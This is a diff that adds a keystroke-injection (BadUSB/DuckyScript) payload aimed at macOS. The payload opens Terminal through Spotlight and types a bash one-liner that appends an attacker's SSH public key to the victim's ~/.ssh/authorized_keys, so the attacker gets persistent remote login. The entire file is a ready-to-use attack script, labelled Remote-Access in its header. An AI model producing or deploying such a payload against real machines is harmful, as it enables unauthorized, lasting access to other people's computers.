@@ -1,0 +1,18 @@
+REM Author: UNC0V3R3D
+REM Description: Injects an attacker's SSH public key into the target's authorized_keys for persistent SSH access.
+REM Version: 1.0
+REM Category: Remote-Access
+REM Target: macOS 10.15+
+REM Requirements: SSH service enabled on target (System Preferences > Sharing > Remote Login)
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 1500
+STRING bash -c "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ATTACKER_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End of payload
